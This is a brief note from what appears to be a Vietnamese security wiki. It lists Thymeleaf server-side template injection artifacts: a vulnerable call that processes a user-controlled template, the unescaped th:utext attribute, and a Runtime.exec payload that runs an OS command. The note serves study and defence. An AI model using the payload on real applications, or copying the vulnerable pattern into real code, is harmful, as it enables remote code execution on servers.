---
title: Thymeleaf SSTI Artifacts
type: entity
related: [[Velocity / Freemarker / Thymeleaf SSTI]]
---

Các artifact Thymeleaf được nhắc đến:

- `templateEngine.process(userControlledString, ctx)`
- `th:utext`
- `${T(java.lang.Runtime).getRuntime().exec('id')}`
- `${new java.util.Scanner(...).useDelimiter('\\A').next()}`
- `th:object`
- `${...}`
- `*{...}`